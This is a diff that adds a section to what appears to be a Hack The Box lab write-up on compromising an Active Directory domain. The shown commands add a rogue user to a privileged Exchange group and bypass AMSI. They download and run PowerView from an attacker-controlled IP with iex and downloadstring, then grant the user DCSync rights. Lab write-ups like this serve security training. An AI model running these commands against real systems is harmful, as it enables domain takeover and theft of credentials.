@@ -810,3 +810,58 @@ To see how to exploit a permission, *right-click* the edge and select *Help*
 
 ## Add New User to *Exchange Windows Permissions* and *Local Administrators*
 
+```bash
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user baggins abc123!@# /add
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" baggins /add
+The command completed successfully.
+```
+
+## Exploit WriteDacl Permission Over HTB.LOCAL
+
+First we need to import PowerView
+
+```bash
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> menu
+
+
+   ,.   (   .      )               "            ,.   (   .      )       .   
+  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
+.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
+_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
+\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
+ |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
+ |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
+/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
+        \/                               \/          \/       \/         \/
+
+       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers
+
+[+] Dll-Loader 
+[+] Donut-Loader 
+[+] Invoke-Binary
+[+] Bypass-4MSI
+[+] services
+[+] upload
+[+] download
+[+] menu
+[+] exit
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Bypass-4MSI
+                                        
+Info: Patching 4MSI, please be patient...
+                                        
+[+] Success!
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> iex(new-object net.webclient).downloadstring('http://10.10.14.63:8080/powerview.ps1')
+```
+Now we need to follow the steps outlined in BloodHound on how to exploit the *WriteDacl* edge
+
+```bash
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $SecPassword = ConvertTo-SecureString 'abc123!@#' -AsPlainText -Force
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $Cred = New-Object System.Management.Automation.PSCredential('htb\baggins', $SecPassword)
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync
+```
